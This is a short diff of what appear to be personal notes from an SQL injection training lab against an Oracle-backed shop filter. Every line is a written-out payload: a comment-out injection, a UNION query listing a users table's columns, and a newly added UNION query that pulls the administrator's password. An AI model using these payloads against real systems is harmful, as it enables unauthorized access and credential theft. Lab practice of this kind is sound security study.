@@ -118,3 +118,7 @@ ANS : GET /filter?category=Gifts'--+
      -Find colums name from Oracle DB  tables
 
       'union SELECT column_name,'ABC' FROM   all_tab_columns WHERE  table_name = 'USERS_BYFICP' --+ : USERNAME_SLTNDT ,PASSWORD_KWSPKR 
+
+     - Find Password of user administrator
+
+      'UNION SELECT PASSWORD_KWSPKR,'ABC' FROM USERS_BYFICP WHERE USERNAME_SLTNDT=''
